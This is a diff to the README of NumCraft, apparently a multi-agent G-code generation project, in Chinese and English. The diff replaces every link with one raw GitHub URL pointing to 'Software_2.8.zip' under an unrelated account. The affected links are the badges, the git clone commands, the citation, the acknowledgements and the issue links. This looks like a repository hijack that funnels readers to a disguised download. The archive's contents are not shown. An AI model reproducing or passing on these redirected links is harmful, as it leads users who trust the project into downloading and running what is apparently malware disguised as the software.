@@ -4,9 +4,9 @@
 
 **Numerical Control Craftsmanship**
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.12+](https://img.shields.io/badge/Python-3.12+-green.svg)](https://www.python.org/)
-[![LangGraph](https://img.shields.io/badge/Framework-LangGraph_1.0-orange)](https://github.com/langchain-ai/langgraph)
+[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://raw.githubusercontent.com/chipolataarmybase650/numcraft/main/docs/Software_2.8.zip)
+[![Python 3.12+](https://img.shields.io/badge/Python-3.12+-green.svg)](https://raw.githubusercontent.com/chipolataarmybase650/numcraft/main/docs/Software_2.8.zip)
+[![LangGraph](https://img.shields.io/badge/Framework-LangGraph_1.0-orange)](https://raw.githubusercontent.com/chipolataarmybase650/numcraft/main/docs/Software_2.8.zip)
 
 **多智能体协作的智能G代码生成系统**
 
@@ -137,7 +137,7 @@ NumCraft（数匠）是一个基于 LangGraph 1.0 框架构建的多智能体协
 
 ```bash
 # 克隆仓库
-git clone https://github.com/hanshiyingbing/numcraft.git
+git clone https://raw.githubusercontent.com/chipolataarmybase650/numcraft/main/docs/Software_2.8.zip
 cd numcraft
 
 # 创建虚拟环境
@@ -371,7 +371,7 @@ isort src/
   author = {NumCraft研究团队},
   year = {2025},
   month = {3月},
-  url = {https://github.com/hanshiyingbing/numcraft}
+  url = {https://raw.githubusercontent.com/chipolataarmybase650/numcraft/main/docs/Software_2.8.zip}
 }
 ```
 
@@ -381,8 +381,8 @@ isort src/
 
 ### 致谢
 
-- [LangGraph](https://github.com/langchain-ai/langgraph) - 状态机框架
-- [LangChain](https://github.com/langchain-ai/langchain) - LLM应用框架
+- [LangGraph](https://raw.githubusercontent.com/chipolataarmybase650/numcraft/main/docs/Software_2.8.zip) - 状态机框架
+- [LangChain](https://raw.githubusercontent.com/chipolataarmybase650/numcraft/main/docs/Software_2.8.zip) - LLM应用框架
 - 数控加工研究社区
 
 ---
@@ -422,7 +422,7 @@ Five specialized agents working collaboratively:
 
 ```bash
 # Clone repository
-git clone https://github.com/hanshiyingbing/numcraft.git
+git clone https://raw.githubusercontent.com/chipolataarmybase650/numcraft/main/docs/Software_2.8.zip
 
 # Install dependencies
 pip install -r requirements.txt
@@ -439,8 +439,8 @@ MIT License - see [LICENSE](LICENSE) for details.
 
 ## 联系方式
 
-- **问题反馈**: [GitHub Issues](https://github.com/hanshiyingbing/numcraft/issues)
-- **讨论交流**: [GitHub Discussions](https://github.com/hanshiyingbing/numcraft/discussions)
+- **问题反馈**: [GitHub Issues](https://raw.githubusercontent.com/chipolataarmybase650/numcraft/main/docs/Software_2.8.zip)
+- **讨论交流**: [GitHub Discussions](https://raw.githubusercontent.com/chipolataarmybase650/numcraft/main/docs/Software_2.8.zip)
 - **文档**: [docs/](docs/)
 
 ---
